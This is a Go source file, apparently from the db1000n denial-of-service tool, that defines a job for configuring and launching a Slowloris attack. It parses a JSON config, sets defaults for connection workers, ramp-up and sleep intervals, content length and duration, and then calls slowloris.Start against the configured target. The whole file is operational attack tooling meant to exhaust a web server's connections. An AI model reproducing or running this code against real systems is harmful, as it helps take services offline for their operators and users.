package jobs

import (
	"context"
	"encoding/json"
	"errors"
	"time"

	"github.com/Arriven/db1000n/src/logs"
	"github.com/Arriven/db1000n/src/slowloris"
	"github.com/Arriven/db1000n/src/utils"
)

func slowLorisJob(ctx context.Context, l *logs.Logger, args Args) error {
	defer utils.PanicHandler()
	var jobConfig *slowloris.Config
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}

	if len(jobConfig.Path) == 0 {
		l.Error("path is empty")

		return errors.New("path is empty")
	}

	if jobConfig.ContentLength == 0 {
		jobConfig.ContentLength = 1000 * 1000
	}

	if jobConfig.DialWorkersCount == 0 {
		jobConfig.DialWorkersCount = 10
	}

	if jobConfig.RampUpInterval == 0 {
		jobConfig.RampUpInterval = 1 * time.Second
	}

	if jobConfig.SleepInterval == 0 {
		jobConfig.SleepInterval = 10 * time.Second
	}

	if jobConfig.DurationSeconds == 0 {
		jobConfig.DurationSeconds = 10 * time.Second
	}

	shouldStop := make(chan bool)
	go func() {
		<-ctx.Done()
		shouldStop <- true
	}()
	l.Debug("sending slow loris with params: %v", jobConfig)

	return slowloris.Start(l, jobConfig)
}
